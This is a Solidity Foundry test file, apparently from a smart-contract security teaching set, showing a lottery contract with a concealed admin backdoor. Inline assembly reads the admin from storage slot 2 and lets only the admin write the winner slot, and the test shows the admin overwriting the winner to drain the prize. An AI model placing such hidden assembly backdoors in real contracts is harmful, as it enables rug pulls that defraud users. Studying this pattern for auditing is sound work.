// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

/* 
Lottery game: anyone can call pickWinner to get prize if you are lucky. 
Refers to JST contract backdoor. many rugged style's contract has similar pattern.
Looks like theres is no setwinner function in contract, how admin can rug?
*/

contract ContractTest is Test {
    LotteryGame LotteryGameContract;

    function testUnsafeCall() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        LotteryGameContract = new LotteryGame();
        console.log(
            "Alice performs pickWinner, of course she will not be a winner"
        );
        vm.prank(alice);
        LotteryGameContract.pickWinner(address(alice));
        console.log("Prize: ", LotteryGameContract.prize());

        console.log("Now, admin sets the winner to drain out the prize.");
        LotteryGameContract.pickWinner(address(bob));
        console.log("Admin manipulated winner: ", LotteryGameContract.winner());
        console.log("Exploit completed");
    }

    receive() external payable {}
}

contract LotteryGame {
    uint256 public prize = 1000;
    address public winner;
    address public admin = msg.sender;

    modifier safeCheck() {
        if (msg.sender == referee()) {
            _;
        } else {
            getkWinner();
        }
    }

    function referee() internal view returns (address user) {
        assembly {
            // load admin value at slot 2 of storage
            user := sload(2)
        }
    }

    function pickWinner(address random) public safeCheck {
        assembly {
            // admin backddoor which can set winner address
            sstore(1, random)
        }
    }

    function getkWinner() public view returns (address) {
        console.log("Current winner: ", winner);
        return winner;
    }
}
